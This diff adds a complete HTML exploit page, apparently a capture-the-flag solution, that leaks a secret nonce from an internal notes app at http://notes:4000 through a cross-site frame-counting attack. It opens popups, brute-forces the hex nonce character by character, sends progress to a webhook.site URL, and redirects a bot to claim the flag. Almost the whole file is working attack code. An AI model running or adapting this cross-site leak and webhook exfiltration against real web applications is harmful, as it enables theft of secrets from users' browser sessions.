@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit</title>
+</head>
+<body>
+    <h1>Exploit Running via GitHub...</h1>
+    <p>Targeting Internal: http://notes:4000</p>
+    <div id="log"></div>
+
+    <script>
+        // [!] YOUR WEBHOOK
+        const WEBHOOK = "https://webhook.site/138cb82c-ddf0-4c85-b48a-d206e5edebf9";
+        
+        // [!] INTERNAL DOCKER TARGET (The bot sees this)
+        const TARGET = "http://notes:4000"; 
+        
+        const CHARS = "0123456789abcdef";
+
+        // Logging helper
+        function report(msg) {
+            document.getElementById('log').innerText += msg + "\n";
+            // Send to your webhook
+            fetch(WEBHOOK + "?log=" + encodeURIComponent(msg), { mode: 'no-cors' });
+        }
+
+        function check(prefix) {
+            return new Promise(resolve => {
+                // 1. Inject Bug (Name=1) 
+                // 2. Search for our guess (prefix)
+                const url = `${TARGET}/?Name=1&referrerPolicy=ad&search=${prefix}`;
+                
+                // Open popup. This works even from HTTPS because window.open is less strict than iframes.
+                const win = window.open(url, "target");
+
+                let checks = 0;
+                const timer = setInterval(() => {
+                    checks++;
+                    // Timeout after 4 seconds
+                    if (checks > 40) { 
+                        clearInterval(timer);
+                        if(win) win.close();
+                        resolve(false); 
+                    }
+
+                    try {
+                        // Check if the page loaded
+                        if (win.length > 0) {
+                            let adCount = 0;
+                            // Count frames named 'ad'
+                            for (let i = 0; i < win.length; i++) {
+                                if (win[i].name === 'ad') adCount++;
+                            }
+
+                            const total = win.length;
+                            const notes = total - adCount;
+
+                            // LOG DEBUG (Only on first success to confirm connection)
+                            if (checks === 5 && prefix === "") {
+                                report(`DEBUG: Connected to ${TARGET} | Notes=${notes}`);
+                            }
+
+                            // SUCCESS: 1 Note found
+                            if (notes === 1) {
+                                clearInterval(timer);
+                                win.close();
+                                resolve(true);
+                            } 
+                            // FAIL: 0 Notes found (but ads loaded)
+                            else if (notes === 0 && adCount > 0) {
+                                clearInterval(timer);
+                                win.close();
+                                resolve(false);
+                            }
+                        }
+                    } catch (e) {
+                        // Ignore cross-origin errors
+                    }
+                }, 100);
+            });
+        }
+
+        async function exploit() {
+            report(`Starting Attack on ${TARGET}`);
+            let nonce = "";
+            
+            while (nonce.length < 8) {
+                let foundChar = false;
+                for (let char of CHARS) {
+                    const candidate = nonce + char;
+                    const found = await check(candidate);
+                    
+                    if (found) {
+                        nonce = candidate;
+                        report("FOUND CHAR: " + nonce);
+                        foundChar = true;
+                        break;
+                    }
+                }
+                
+                if (!foundChar) {
+                    report("Stuck. Retrying current position...");
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+            }
+
+            if (nonce) {
+                report("FINAL NONCE: " + nonce);
+                // Redirect the bot to the guess endpoint to get the flag
+                window.location = `${TARGET}/guess?nonce=${nonce}`;
+            }
+        }
+
+        exploit();
+    </script>
+</body>
+</html>
